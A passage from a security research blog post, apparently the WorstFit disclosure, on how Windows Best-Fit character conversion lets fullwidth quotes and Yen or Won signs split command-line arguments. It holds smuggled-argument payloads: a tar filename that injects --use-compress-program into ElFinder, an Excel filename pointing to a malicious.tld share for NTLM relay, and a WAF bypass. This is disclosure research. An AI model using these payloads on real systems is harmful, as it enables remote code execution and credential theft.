&lt;p&gt;Let‚Äôs back to our payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÔºÇ --use-askpass=calc ÔºÇ&lt;/code&gt;. I guess now some of you might still be wondering: &lt;em&gt;Wait, how does a simple double quote bypass the escaping? What exactly does it escape, then?&lt;/em&gt; Well, first of all, these aren‚Äôt just regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) ‚Äî they‚Äôre actually &lt;strong&gt;fullwidth double quotes&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) üòâ. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes (&lt;a href=&quot;https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22&quot;&gt;üîç&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;But still, why can these double quotes alter the arguments?&lt;/p&gt;

&lt;p&gt;Firstly, on Windows, the &lt;strong&gt;entire command line&lt;/strong&gt; is passed as a single string to the spawned process, leaving it up to the executable to parse. That‚Äôs why the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&quot;&gt;CreateProcess API&lt;/a&gt; accepts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lpCommandLine&lt;/code&gt; patameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out &lt;a href=&quot;https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN&quot;&gt;this article&lt;/a&gt; by David Deley.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Secondly, because the command line string is stored internally in wide character (Unicode) format, retrieving its ANSI string version involves Windows using the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;&lt;/a&gt; API.  Which of course the Best-Fit feature is applied during this process, potentially altering the command line in subtle but impactful ways.&lt;/p&gt;

&lt;p&gt;But actually, there isn‚Äôt a single ‚Äústandard‚Äù way to parse the command line on Windows. However, the parsing convention typically adheres to the rules of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt;&lt;/a&gt; or &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/cpp/main-function-command-line-args#parsing-c-command-line-arguments&quot;&gt;CRT command-line parsing&lt;/a&gt;. In practice, most developers use either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLineToArgvW&lt;/code&gt; or CRT standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main(...)&lt;/code&gt; to handle command-line arguments, so I‚Äôd say we can pretty much treat this as the standard. The key characters involved in the parsing process include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Tabs (0x09) and spaces (0x20)&lt;/strong&gt;: Used to separate arguments (except when in quote mode).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; (0x22)&lt;/strong&gt;: Toggles the quote mode to treat spaces as part of the argument.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; (0x5C)&lt;/strong&gt;: Escapes double quotes and backslashes when used in a specific sequence.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These conventions form the foundation of how arguments are interpreted and passed to executables.&lt;/p&gt;

&lt;p&gt;Therefore, standard libraries and functions in most programming languages adhere to these parsing rules to sanitize user-provided arguments.  For instance, in &lt;strong&gt;PHP&lt;/strong&gt;, the &lt;a href=&quot;https://www.php.net/manual/en/function.escapeshellarg.php&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt;&lt;/a&gt; function replaces double quotes with spaces, wraps the argument in quotes, and escapes backslashes as needed to ensure safe execution in the shell.  Similarly, in &lt;strong&gt;Python&lt;/strong&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module internally uses the &lt;a href=&quot;https://github.com/python/cpython/blob/v3.12.8/Lib/subprocess.py#L576&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list2cmdline&lt;/code&gt;&lt;/a&gt; function to convert a Python list into a command line string, escaping arguments strictly according to the Microsoft CRT command-line parsing logic.&lt;/p&gt;

&lt;p&gt;However, all of this escaping happens before the Best-Fit feature comes into play. This means that even carefully escaped arguments can still be altered during the ANSI conversion process.&lt;/p&gt;

&lt;p&gt;Here‚Äôs a simple example. Using the example Python code we provided, let‚Äôs examine what happens when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget.exe&lt;/code&gt; is spawned with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module. The entire argument parsing process would look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we saw, fullwidth quotation marks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) are transformed into regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) during the Best-Fit conversion process. This subtle alteration changes the original command-line syntax, enabling argument-splitting behavior.&lt;/p&gt;

&lt;p&gt;Furthermore, even programs that don‚Äôt directly use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt; can still be vulnerable to this attack if they rely on the non-Unicode version of the main function. Yes, we‚Äôre talking about the &lt;strong&gt;innocent-looking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Here we can do a small experiment. Given this piece of code&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, when we run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.\test.exe &quot;fooÔºÇ ÔºÇbar&quot;&lt;/code&gt;, it does produce two arguments, as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And yes, Python‚Äôs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module can‚Äôt prevent this. Even if the entire string is passed as a single list element, it still ends up being parsed into two separate arguments.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The reason a normal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function becomes vulnerable lies in how the &lt;strong&gt;C runtime (CRT)&lt;/strong&gt; handles command-line arguments.  Even if you don‚Äôt explicitly call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;, once you use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt; function, the compiler secretly generates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup&lt;/code&gt; function inside your binary for you. This startup function is linked to the C runtime library (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucrtbase.dll&lt;/code&gt;), which internally retrieves the command line using an ANSI API and parses it for you. And that‚Äôs where the vulnerability creeps in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is why so many executables are exposed to WorstFit vulnerabilities. Worse still, as the attack exploits behavior at the system level during the conversion process, &lt;strong&gt;no standard library in any programming language can fully stop our attack!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, only on 125x and 874 code pages does the fullwidth quotation mark (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!&lt;/p&gt;

&lt;p&gt;As mentioned in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) on the Japanese (932) code page and the Won sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+20A9&lt;/code&gt;) on the Korean (949) code page are both converted into a &lt;strong&gt;backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;)&lt;/strong&gt;. And what can a backslash do? Quite a lot! As we‚Äôve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line. This means it can be exploited to manipulate command execution.&lt;/p&gt;

&lt;p&gt;Let‚Äôs take this Python code as an example:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;vuln.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;foo¬•&quot; bar&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here, Python handles escaping for us ‚Äì in this case, escaping the double quote. After escaping, the command line should look like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo¬•\&quot; bar&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateProcessW&lt;/code&gt; API, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; spawns successfully. Great!&lt;/p&gt;

&lt;p&gt;However, here‚Äôs where it gets tricky. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; program uses an &lt;strong&gt;ANSI API&lt;/strong&gt; to retrieve the command line. Thanks to the Best-Fit feature (again üòú), the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¬•&lt;/code&gt;) is converted into a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;). Now, the command line seen by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; becomes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo\\&quot; bar&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The backslash added by Python is now escaped by the ‚Äúex-Yen-sign‚Äù. As a result, that double quote is no longer properly escaped, allowing it to act as a delimiter. The arguments for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; are now split into two parts: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo\&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;: Of course, characters that can be converted into spaces or tabs can also be exploited for argument splitting. I‚Äôll leave this part as an exercise for you üòâ.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, we already explored most of the possible ways to exploit WorstFit for argument splitting. Let‚Äôs dive into some real-world exploits and see this attack in action!&lt;/p&gt;

&lt;h4 id=&quot;-case-study-1---elfinder-rce-w-windows-built-in-gnu-tar&quot;&gt;‚û§ Case Study 1 - ElFinder: RCE w/ Windows built-in GNU Tar&lt;/h4&gt;

&lt;p&gt;Here, one of our case studies highlights an RCE (Remote Code Execution) attack on &lt;a href=&quot;https://github.com/Studio-42/elFinder&quot;&gt;&lt;strong&gt;ElFinder&lt;/strong&gt;&lt;/a&gt;, caused by the WorstFit vulnerability in Windows‚Äô &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;ElFinder is a popular open-source, web-based file manager with a PHP backend. By default, it supports Windows servers and comes with a built-in feature for creating and extracting archives, which is also enabled by default.&lt;/p&gt;

&lt;p&gt;The way it handles archive formats is straightforward‚Äîit directly executes shell commands.  Sounds risky? Perhaps. But the developers have taken precautions by escaping all arguments properly using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt; (&lt;a href=&quot;https://github.com/Studio-42/elFinder/blob/7544918a2ba656a4fe72a6fc8bb502d39f601cda/php/elFinderVolumeDriver.class.php#L6898-L6911&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php/elFinderVolumeDriver.class.php#L6898-L6911&lt;/code&gt;&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despite this effort, escaping at the application level might not fully mitigate risks if quirks like the Best-Fit feature in Windows are involved.&lt;/p&gt;

&lt;p&gt;One of the archive formats supported by ElFinder is the &lt;strong&gt;tar&lt;/strong&gt; format. It uses the system‚Äôs built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command to create or extract archives. For example, if we create an archive named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foobar.tar&lt;/code&gt; containing the files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar.txt&lt;/code&gt;, ElFinder would just execute the following command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe -chf &quot;foobar.tar&quot; &quot;.\foo.txt&quot; &quot;.\bar.txt&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However, we discovered that the Windows built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command is vulnerable to the &lt;strong&gt;WorstFit&lt;/strong&gt; attack! This means that if you can control even a small part of an argument, it‚Äôs possible to execute arbitrary commands. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/tar/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To exploit this, we can simply name the tar file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaaÔºÇ ÔºÇ--use-compress-program=calcÔºÇ ÔºÇbbb.tar&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÔºÇ&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;). This injects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--use-compress-program&lt;/code&gt; parameter, which allows arbitrary command execution. In our demonstration, this results in popping up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;blockquote&gt;
  &lt;p&gt;In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-case-study-2---all-the-ways-to-code-execution&quot;&gt;‚û§ Case Study 2+ - All the Ways to Code Execution&lt;/h4&gt;

&lt;p&gt;Of course, there are more applications are indirectly exposed to WorstFit vulnerabilities because they invoke other executables that are themselves vulnerable to this. Here we demonstrate two examples:&lt;/p&gt;

&lt;p&gt;The first one involves a modified version of plink.exe used in &lt;strong&gt;TortoiseGit&lt;/strong&gt;. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/plink/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;The second example involves &lt;strong&gt;RStudio&lt;/strong&gt;, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user‚Äôs machine! For more details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/SVN/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026&quot;&gt;‚û§ Case Study 3 - Microsoft Excel Remote Code Execution &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the ‚ÄúOpen-With‚Äù feature to escalate its impact!&lt;/p&gt;

&lt;p&gt;Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftype&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assoc&lt;/code&gt; to see which programs handle specific file extensions. The filename would also become part of the argument, which means we can apply our attack through that!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack. We can just rename the Excel file to the following name - translating all dots, (back-)slashes, and double quote to their fullwidth forms.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ÔºéÔºéÔºèÔºéÔºéÔºèÔºéÔºéÔºèWindowsÔºèwin.iniÔºÇ Ôºèn ÔºÇÔººÔººmalicious.tld@80Ôººpwn.xlsx&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;By combining two tricks, we can trigger an Argument Injection on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excel.exe&lt;/code&gt; with just 1-Clik. Since Excel itself &lt;a href=&quot;https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel&quot;&gt;doesn‚Äôt have any good argument&lt;/a&gt; for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;em&gt;P.S. if you find a better argument that can directly lead to RCE, please let us know!&lt;/em&gt; üôÇ&lt;/p&gt;

&lt;h3 id=&quot;-environment-variable-confusion&quot;&gt;üî• Environment Variable Confusion&lt;/h3&gt;

&lt;p&gt;When functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentStringsA&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt; are used, they return the &lt;strong&gt;Best-Fit&lt;/strong&gt; version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: No specific&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: No specific (for Apache HTTPd: 0x00-0xFF)&lt;/p&gt;

&lt;p&gt;For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process.&lt;/p&gt;

&lt;p&gt;A common example is in &lt;strong&gt;CGI (Common Gateway Interface)&lt;/strong&gt;, where much of the HTTP request information‚Äîsuch as query strings, HTTP headers, and more‚Äîis passed through environment variables. This creates an opportunity for attackers to manipulate these variables and exploit the behavior. Here, we present two case studies as a starting point to spark your further ideas.&lt;/p&gt;

&lt;h4 id=&quot;-case-study-1---waf-bypass&quot;&gt;‚û§ Case study 1 - WAF bypass&lt;/h4&gt;

&lt;p&gt;In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/admin&lt;/code&gt; from the web server, instead of the CGI itself. For example, in an Apache setup, they might add the following rule to deny access:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;/var/www/cgi-bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;%{REQUEST_URI} =~ m#/admin#&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, due to the &lt;strong&gt;WorstFit vulnerability&lt;/strong&gt; in Perl on Windows, this rule can be bypassed by substituting characters in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; with their &lt;strong&gt;Best-Fit equivalents&lt;/strong&gt;. For instance, in &lt;strong&gt;Code Page 1250&lt;/strong&gt;, the character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;√†&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00E0&lt;/code&gt;) is converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; during the ANSI conversion.&lt;/p&gt;

